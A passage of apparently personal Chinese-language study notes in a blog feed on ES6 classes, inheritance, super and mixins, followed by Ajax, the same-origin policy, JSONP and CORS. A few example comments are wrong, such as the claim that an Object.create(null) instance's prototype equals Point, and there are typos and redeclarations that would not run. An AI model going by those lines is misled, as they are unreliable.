class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">//es5</div><div class="line">function Point(x, y) &#123;</div><div class="line">  this.x = x;</div><div class="line">  this.y = y;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Point.prototype.toString = function () &#123;</div><div class="line">  return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">var p = new Point(1, 2);</div><div class="line">//es6</div><div class="line">let methodName = &apos;getArea&apos;;</div><div class="line">class Point &#123;</div><div class="line">  constructor(x, y) &#123;</div><div class="line">    this.x = x;</div><div class="line">    this.y = y;</div><div class="line">    this.toString = function()&#123;</div><div class="line">      console.log(111);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  toString() &#123;</div><div class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  [methodName]() &#123;</div><div class="line">    console.log(666);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">var temp = new Point(&apos;helo&apos;,&apos;world&apos;);</div><div class="line">console.log(temp)// constructor定义的内容</div><div class="line">console.log(temp.toString()) //先找实例属性，在去原型找属性</div><div class="line"></div><div class="line">console.log(typeof Point) // &quot;function&quot;</div><div class="line">console.log(Point === Point.prototype.constructor) // true</div><div class="line"></div><div class="line">console.log(Object.keys(Point.prototype));//[]</div><div class="line">console.log(Object.getOwnPropertyNames(Point.prototype));//[&quot;constructor&quot;, &quot;toString&quot;]</div><div class="line">Object.assign(Point.prototype, &#123;</div><div class="line">  toString222()&#123;console.log(222);&#125;,</div><div class="line">  toValue()&#123;console.log(333);&#125;</div><div class="line">&#125;);</div><div class="line">temp.toString222()</div><div class="line">console.log(Object.keys(Point.prototype));//[&quot;toString222&quot;, &quot;toValue&quot;]</div><div class="line">console.log(Object.getOwnPropertyNames(Point.prototype));//[&quot;constructor&quot;, &quot;toString&quot;, &quot;toString222&quot;, &quot;toValue&quot;]</div><div class="line"></div><div class="line"></div><div class="line">temp[methodName]() //666</div><div class="line"></div><div class="line">class Foo &#123;</div><div class="line">  constructor() &#123;</div><div class="line">    return Object.create(null);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">console.log(Foo.name)//Foo</div><div class="line">console.log(new Foo() instanceof Foo)//false</div><div class="line">var tt = new Foo();</div><div class="line">console.log(tt.__proto__ == Point) //TRUE</div><div class="line"></div><div class="line">var p1 = new Point(2,3);</div><div class="line">var p2 = new Point(3,2);</div><div class="line">console.log(p1.__proto__ === p2.__proto__)//true</div><div class="line">p1.__proto__.printName = function () &#123; console.log(&apos;Oops&apos;) &#125;;</div><div class="line">p1.printName() // &quot;Oops&quot;</div><div class="line">p2.printName() // &quot;Oops&quot;</div><div class="line">var p3 = new Point(4,2);</div><div class="line">p3.printName() // &quot;Oops</div><div class="line"></div><div class="line">//这个类的名字是MyClass而不是Me，Me只在 Class 的内部代码可用，指代当前类。</div><div class="line">const MyClass = class Me &#123;</div><div class="line">  getClassName() &#123;</div><div class="line">    console.log(Me.name);</div><div class="line">  &#125;</div><div class="line">&#125;;</div><div class="line">let inst = new MyClass();</div><div class="line">inst.getClassName() // Me</div><div class="line">console.log(MyClass.name)//me</div><div class="line"></div><div class="line">//立即执行的 Class</div><div class="line">let person = new class &#123;</div><div class="line">  constructor(name) &#123;</div><div class="line">    this.name = name;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  sayName() &#123;</div><div class="line">    console.log(this.name);</div><div class="line">  &#125;</div><div class="line">&#125;(&apos;张三&apos;);</div><div class="line"></div><div class="line">person.sayName(); // &quot;张三&quot;</div><div class="line"></div><div class="line">class MyClass &#123;</div><div class="line">  constructor() &#123;</div><div class="line">    // ...</div><div class="line">  &#125;</div><div class="line">  get prop() &#123;</div><div class="line">    return &apos;getter&apos;;</div><div class="line">  &#125;</div><div class="line">  set prop(value) &#123;</div><div class="line">    console.log(&apos;setter: &apos;+value);</div><div class="line">  s&#125;</div><div class="line">let inst = new MyClass();</div><div class="line">inst.prop = 123;// setter: 123</div><div class="line">console.log(inst.prop)// &apos;getter&apos;</div></pre></td></tr></table></figure>
<p>1.constructor函数定义实例属性，this代表实例对象，生成对象实例时，自动调用该方法，<br>  默认返回实例对象this，也可以指定返回另外一个对象，则生成的实例将是另外这个对象的实例<br>  如果没有显式定义，一个空的constructor方法会被默认添加。<br>  其他在constructor函数之外定义的函数全都挂在类的prototype对象上(没有定义在this上的全都定义在class上)<br>  其实constructor函数也挂在prototype对象上<br>2.定义原型方法时，不需要加上function这个关键字，方法之间不需要逗号分隔<br>3.类的数据类型就是函数，类本身就指向构造函数<br>4.使用Object.assign()新增原型方法,定义类时定义的原型方法是不可枚举的，但Object.assign()新增的可枚举<br>5.可以使用变量值做原型方法名<br>6.定义实例仍使用new关键字,且必须使用new定义，否则会报错<br>7.类的所有实例共享一个原型对象,使用实例的<strong>proto</strong>属性改写原型,会改变“类”的原始定义，影响到所有实例<br>8.类也可以使用表达式的形式定义,采用 Class 表达式，可以写出立即执行的 Class<br>9.类必须先定义再使用，无论是生成实例还是进行继承<br>10.类的name属性总是返回紧跟在class关键字后面的类名。<br>11.对某个属性设置对应的存值函数和取值函数，因此赋值和读取行为都被自定义了。存值函数和取值函数是设置在属性的 Descriptor 对象上的。<br>12.静态方法,该方法不会被实例继承，而是直接通过类来调用<br>如果静态方法包含this关键字，这个this指的是类，而不是实例<br>父类的静态方法，可以被子类继承。<br>静态方法也是可以从super对象上调用的<br>13.<br>ES6 为new命令引入了一个new.target属性，该属性一般用在构造函数之中，返回new命令作用于的那个构造函数。如果构造函数不是通过new命令调用的，new.target会返回undefined，因此这个属性可以用来确定构造函数是怎么调用的。</p>
<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">class Point &#123;</div><div class="line">  constructor(x, y) &#123;</div><div class="line">    this.x = x;</div><div class="line">    this.y = y;</div><div class="line">    console.log(new.target.name);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class ColorPoint extends Point &#123;</div><div class="line">  constructor(x, y, color) &#123;</div><div class="line">    super(x, y);</div><div class="line">    this.color = color;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">let cp0 = new Point(25, 8);//&quot;Point&quot;</div><div class="line">let cp = new ColorPoint(25, 8, &apos;green&apos;);//&quot;ColorPoint&quot; super()使用</div><div class="line"></div><div class="line">console.log(cp instanceof ColorPoint)//true</div><div class="line">console.log(cp instanceof Point)//true</div><div class="line">console.log(Object.getPrototypeOf(ColorPoint) === Point)</div><div class="line"></div><div class="line">console.log(ColorPoint.__proto__ === Point) // true</div><div class="line">console.log(ColorPoint.prototype.__proto__ === Point.prototype) // true</div><div class="line"></div><div class="line">console.log(cp.__proto__.__proto__ === cp0.__proto__ )// true</div><div class="line">cp.__proto__.__proto__.printName = function () &#123;</div><div class="line">  console.log(&apos;Ha&apos;);</div><div class="line">&#125;;</div><div class="line"></div><div class="line">cp0.printName() // &quot;Ha&quot;</div></pre></td></tr></table></figure>
<p>1、使用extends关键字进行继承：class 子类名 extends 父类名{}<br>2、在子类构造函数constructor中使用super关键字继承父类this对象,必需在super语句之后使用this<br>3、Object.getPrototypeOf方法可以用来从子类上获取父类<br>4、子类的<strong>proto</strong>属性，表示构造函数的继承，总是指向父类。<br>   子类prototype属性的<strong>proto</strong>属性，表示方法的继承，总是指向父类的prototype属性。<br>5、子类的原型的原型，是父类的原型，通过子类实例的<strong>proto</strong>.<strong>proto</strong>属性，可以修改父类实例的行为</p>
<h3 id="关于super关键字"><a href="#关于super关键字" class="headerlink" title="关于super关键字"></a>关于super关键字</h3><p>1、用作函数<br>作为函数时，super()只能用在子类的构造函数之中，用在其他地方就会报错，代表调用父类构造函数<br>super()在这里相当于parent.prototype.constructor.call(this),this指子类</p>
<p>2、用作对象</p>
<p>作为对象使用时,在普通方法中指向父类原型对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">class A &#123;</div><div class="line">  constructor() &#123;</div><div class="line">    this.p = 2;</div><div class="line">  &#125;</div><div class="line">  q() &#123;</div><div class="line">    console.log(this.p)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class B extends A &#123;</div><div class="line">    constructor() &#123;</div><div class="line">    super();</div><div class="line">    this.p =3</div><div class="line">    super.q();</div><div class="line">    super.p = 5;</div><div class="line">    console.log(super.p); // undefined</div><div class="line">    console.log(this.p); // 5</div><div class="line">    super.tt = 6;</div><div class="line">    console.log(this.tt); // 6</div><div class="line">    console.log(super.valueOf() instanceof B); // true</div><div class="line">  &#125;</div><div class="line">  get m() &#123;</div><div class="line">    return super.p;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">let b = new B();//3</div><div class="line">console.log(b.m) // undefined</div></pre></td></tr></table></figure></p>
<p>在普通方法中指向父类原型对象,即使用super.xxxx(),相当于使用parent.prototype.xxxx(),<br>所以只能调用父类原型属性方法,不能使用实例属性方法</p>
<p>通过super调用父类的方法时,super会绑定子类的this,<br>即在子类使用super.xxxx()时,xxxx()里面的this指子类<br>通过super对某个属性赋值,赋值的属性会变成子类实例的属性</p>
<p>在静态方法中使用super将指向父类，而不是父类的原型对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">class Parent &#123;</div><div class="line">  static myMethod(msg) &#123;</div><div class="line">    console.log(&apos;static&apos;, msg);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  myMethod(msg) &#123;</div><div class="line">    console.log(&apos;instance&apos;, msg);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Child extends Parent &#123;</div><div class="line">  static myMethod(msg) &#123;</div><div class="line">    super.myMethod(msg);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  myMethod(msg) &#123;</div><div class="line">    super.myMethod(msg);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Child.myMethod(1); // static 1 super在静态方法之中指向父类</div><div class="line"></div><div class="line">var child = new Child();</div><div class="line">child.myMethod(2); // instance 2 在普通方法之中指向父类的原型对象。</div></pre></td></tr></table></figure></p>
<h3 id="extends特殊对象"><a href="#extends特殊对象" class="headerlink" title="extends特殊对象"></a>extends特殊对象</h3><p>第一种特殊情况，子类继承Object类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class A extends Object &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === Object // true</div><div class="line">A.prototype.__proto__ === Object.prototype // true</div></pre></td></tr></table></figure></p>
<p>这种情况下，A其实就是构造函数Object的复制，A的实例就是Object的实例。</p>
<p>第二种特殊情况，不存在任何继承。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class A &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === Function.prototype // true</div><div class="line">A.prototype.__proto__ === Object.prototype // true</div></pre></td></tr></table></figure></p>
<p>这种情况下，A作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承Function.prototype。但是，A调用后返回一个空对象（即Object实例），所以A.prototype.<strong>proto</strong>指向构造函数（Object）的prototype属性。</p>
<p>第三种特殊情况，子类继承null。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">class A extends null &#123;</div><div class="line">&#125;</div><div class="line"></div><div class="line">A.__proto__ === Function.prototype // true</div><div class="line">A.prototype.__proto__ === undefined // true</div></pre></td></tr></table></figure></p>
<p>这种情况与第二种情况非常像。A也是一个普通函数，所以直接继承Function.prototype。但是，A调用后返回的对象不继承任何方法，所以它的<strong>proto</strong>指向Function.prototype，即实质上执行了下面的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">class C extends null &#123;</div><div class="line">  constructor() &#123; return Object.create(null); &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第四种情况,允许继承原生构造函数定义子类,但无法通过super方法向父类Object传参<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">class NewObj extends Object&#123;</div><div class="line">  constructor()&#123;</div><div class="line">    super(...arguments);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">var o = new NewObj(&#123;attr: true&#125;);</div><div class="line">console.log(o.attr === true)  // false</div></pre></td></tr></table></figure></p>
<h3 id="Mixin-模式"><a href="#Mixin-模式" class="headerlink" title="Mixin 模式"></a>Mixin 模式</h3><p>使用如下mix函数将多个对象合成为一个类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">function mix(...mixins) &#123;</div><div class="line">  class Mix &#123;&#125;</div><div class="line"></div><div class="line">  for (let mixin of mixins) &#123;</div><div class="line">    copyProperties(Mix, mixin);</div><div class="line">    copyProperties(Mix.prototype, mixin.prototype);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  return Mix;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function copyProperties(target, source) &#123;</div><div class="line">  for (let key of Reflect.ownKeys(source)) &#123;</div><div class="line">    if ( key !== &quot;constructor&quot;</div><div class="line">      &amp;&amp; key !== &quot;prototype&quot;</div><div class="line">      &amp;&amp; key !== &quot;name&quot;</div><div class="line">    ) &#123;</div><div class="line">      let desc = Object.getOwnPropertyDescriptor(source, key);</div><div class="line">      Object.defineProperty(target, key, desc);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//使用：继承返回的合成类</div><div class="line">class DistributedEdit extends mix(Loggable, Serializable) &#123;</div><div class="line">  // ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;对象特性&quot;&gt;&lt;a href=&quot;#对象特性&quot; class=&quot;headerlink&quot; title=&quot;对象特性&quot;&gt;&lt;/a&gt;对象特性&lt;/h1&gt;&lt;p&gt;对象的属性在定义时，都带有一些特征值，js通过这些特征值定义他们的行为&lt;br&gt;这些特征值描述对象属性的各种特征,成为对象属性
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>Ajax和跨域</title>
    <link href="http://yoohannah.github.io/post/knowledge/ajax.html"/>
    <id>http://yoohannah.github.io/post/knowledge/ajax.html</id>
    <published>2017-08-19T01:56:37.000Z</published>
    <updated>2017-08-19T02:05:13.871Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ajax"><a href="#ajax" class="headerlink" title="ajax"></a>ajax</h1><p>ajax全称Asynchronous JavaScript and XML（异步的JavaScript与XML），是网页无需刷新页面、使用js与服务器进行交互的一种技术。</p>
<p>ajax的基本流程可以概括为：页面上js脚本实例化一个XMLHttpRequest对象，设置好服务器端的url、必要的查询参数、回调函数之后，向服务器发出请求，<br>服务器在处理请求之后将处理结果返回给页面，触发事先绑定的回调函数。<br>这样，页面脚本如果想要改变一个区域的内容，只需要通过ajax向服务器获取与该区域有关的少量数据，在回调函数中将该区域的内容替换掉即可，不需要刷新整个页面。</p>
<p>XMLHttpRequest在发送请求的时候，有两种方式：同步与异步。<br>同步方式是请求发出后，一直到收到服务器返回的数据为止，浏览器进程被阻塞，页面上什么事也做不了。<br>而异步方式则不会阻塞浏览器进程，在服务端返回数据并触发回调函数之前，用户依然可以在该页面上进行其他操作。<br>ajax的核心是异步方式，而同步方式只有在极其特殊的情况下才会被用到。</p>
<p>XMLHttpRequest 对象是一个接口，用于创建一个http请求对象实例,打开一个URL，然后发送这个请求,<br>当传输完毕后，结果的HTTP状态以及返回的响应内容也可以从请求对象中获取<br>五种状态<br>0：未打开<br>1：未发送<br>2：以获取响应头<br>3：正在下载响应体<br>4：请求完成<br><a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="external">XMLHttpRequest API</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">const xhr = new XMLHttpRequest()</div><div class="line"></div><div class="line">xhr.onreadystatechange = function () &#123;</div><div class="line">  switch (xhr.readyState) &#123;</div><div class="line">    case 0:</div><div class="line">      // UNSENT (未打开)</div><div class="line">      debugger</div><div class="line">      break</div><div class="line">    case 1:</div><div class="line">      // OPENED  (未发送)</div><div class="line">      debugger</div><div class="line">      break</div><div class="line">    case 2:</div><div class="line">      // HEADERS_RECEIVED (已获取响应头)</div><div class="line">      debugger</div><div class="line">      break</div><div class="line">    case 3:</div><div class="line">      // LOADING (正在下载响应体)</div><div class="line">      debugger</div><div class="line">      break</div><div class="line">    case 4:</div><div class="line">      // DONE (请求完成)</div><div class="line">      if (xhr.status === 200) &#123;</div><div class="line">        console.log(xhr.responseType)</div><div class="line">        console.log(xhr.responseText)</div><div class="line">        console.log(xhr.response)</div><div class="line">      &#125;</div><div class="line">      break</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">xhr.open(&apos;GET&apos;, &apos;http://y.com:7001/json&apos;, true)</div><div class="line">xhr.send(null)</div></pre></td></tr></table></figure>
<h1 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h1><p>为了保证用户信息的安全，防止恶意的网站窃取数据<br>解决办法：同源策略<br>同源策略是指三个相同：协议相同,域名相同,端口相同<br>以上三个不相同则是非同源，非同源之间相互访问即跨域访问</p>
<p>跨域和ip没有关系</p>
<h1 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h1><p>浏览器在阻止跨域,阻止方式可能是在一开始就限制了发起跨站的请求，也可能是跨站请求可以正常发起，但返回结果被浏览器拦截了</p>
<h2 id="为什么要防止跨域"><a href="#为什么要防止跨域" class="headerlink" title="为什么要防止跨域"></a>为什么要防止跨域</h2><p>跨域访问时会受到同源策略的三个限制<br>1、Cookie、LocalStorage 和 IndexDB 无法读取。<br>通过浏览器document.cookie我们可以获取用户登录态,如果cookie可以读取的话，<br>就会出现在A公司网站里可以去B公司网站获取登录信息的事情,这样就容易将用户信息泄露<br>2、DOM 无法获得<br>如果DOM可以获得,现在我是一个假网站，利用iframe套嵌一个目前线上运营的电商网站,那么<br>消费者在输入支付密码时,那我就可以获取input的值,从而获取用户支付密码<br>3、AJAX 请求不能发送<br>如果AJAx可以发送的话，那我们就能将内网东西下载下来发送到外网服务器，从而造成内网信息泄露</p>
<h2 id="如何实现跨域"><a href="#如何实现跨域" class="headerlink" title="如何实现跨域"></a>如何实现跨域</h2><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h3><p>原理是利用&lt;script&gt;标签可以在任何域下获取资源的原理，将要跨域获取的接口url放在&lt;script&gt;标签的src里面，<br>然后js将标签放到body里面，其中url包含一个callback参数，用于指向处理response的函数，这个函数我们挂载的window上,<br>即我们在js中定义的的函数</p>
<p>如果在浏览器直接访问接口’<a href="http://x.com:7001/json?callback=xxx" target="_blank" rel="external">http://x.com:7001/json?callback=xxx</a>‘<br>页面会显示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/**/ typeof xxx === &apos;function&apos; &amp;&amp; xxx(&#123;&quot;msg&quot;:&quot;hello world&quot;&#125;);</div></pre></td></tr></table></figure></p>
<p>就是说,在请求这个接口时,会去window上找xxx这个对象，看它是不是函数，如果是函数，<br>就将接口定义的response（{“msg”:”hello world”}）作为参数传递给xxx函数,并执行xxx函数</p>
<p>现在在<a href="http://y.com/x.html页面中进行跨域" target="_blank" rel="external">http://y.com/x.html页面中进行跨域</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">//json 接口  服务端</div><div class="line"></div><div class="line">module.exports = app =&gt; &#123;</div><div class="line">  class MsgController extends app.Controller &#123;</div><div class="line">    * index(req) &#123;</div><div class="line">      this.ctx.body = &#123; msg: &apos;hello world&apos; &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return MsgController</div><div class="line">&#125;</div><div class="line"></div><div class="line">// js 客户端请求</div><div class="line">//方法一：</div><div class="line"></div><div class="line">//定义相应处理函数</div><div class="line">window.xxx = function (value) &#123;</div><div class="line">  console.log(value)</div><div class="line">&#125;</div><div class="line">//添加script标签</div><div class="line">var script = document.createElement(&apos;script&apos;)</div><div class="line">script.src = &apos;http://x.com:7001/json?callback=xxx&apos;</div><div class="line">document.body.appendChild(script)</div><div class="line"></div><div class="line">//方法二：</div><div class="line">require([&apos;http://x.com:7001/json?callback=define&apos;], function (value) &#123;</div><div class="line">  console.log(value)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<p>现在访问<a href="http://y.com/x.html,在浏览器console就会打印{&quot;msg&quot;:&quot;hello" target="_blank" rel="external">http://y.com/x.html,在浏览器console就会打印{&quot;msg&quot;:&quot;hello</a> world”}</p>
<h3 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h3><p>XMLHttpRequest 2.0以后可以使用cors方法进行跨域<br>CORS需要浏览器和服务器同时支持<br>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。<br>对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。<br>浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。<br>实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">//cors接口 服务端</div><div class="line">module.exports = app =&gt; &#123;</div><div class="line">  class CrosController extends app.Controller &#123;</div><div class="line">    * index(req) &#123;</div><div class="line">      this.ctx.set(&apos;Access-Control-Allow-Origin&apos;, &apos;*&apos;)//如果不添加则会禁止访问</div><div class="line">      // this.ctx.set(&apos;Access-Control-Allow-Origin&apos;, &apos;http://xx.com&apos;)</div><div class="line">      // 如果我们要 http://*.qq.com 都支持跨域怎么办？</div><div class="line">      this.ctx.body = &#123; msg: &apos;hello world&apos; &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return CrosController</div><div class="line">&#125;</div><div class="line"></div><div class="line">//js应用 客户端</div><div class="line">var xhr = new XMLHttpRequest()</div><div class="line">xhr.onreadystatechange = function () &#123;</div><div class="line">  if (xhr.readyState === 4 &amp;&amp; xhr.status === 200) &#123;</div><div class="line">    console.log(JSON.parse(xhr.responseText).msg)</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">xhr.withCredentials = true//在头部添加cookie带到y.stuq,如果不设置，则不带</div><div class="line">xhr.open(&apos;GET&apos;, &apos;http://x.com:7001/cros&apos;)</div><div class="line">xhr.send(null)</div></pre></td></tr></table></figure>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">跨域资源共享 CORS 详解</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="external">HTTP访问控制（CORS）</a></p>
<p>Access-Control-Allow-Origin 的属性值只允许设置为单个确定域名字符串或者 (<em>),设置</em>的话，最不安全，允许所有域可以访问</p>
<p>在服务器端设置CORS跨域请求中的多域名白名单，可以实现Access-Control-Allow-Origin 允许对某一个或几个网站开放跨域请求权限</p>
<p>原理就是在服务器端判断请求的Header中Origin属性值（req.header.origin）是否在我们的域名白名单列表内。<br>如果在白名单列表内，那么我们就把 Access-Control-Allow-Origin 设置成当前的Origin值，这样就满足了Access-Control-Allow-Origin 的单一域名要求，也能确保当前请求通过访问；如果不在白名单列表内，则返回错误信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">// 判断origin是否在域名白名单列表中</div><div class="line">function isOriginAllowed(origin, allowedOrigin) 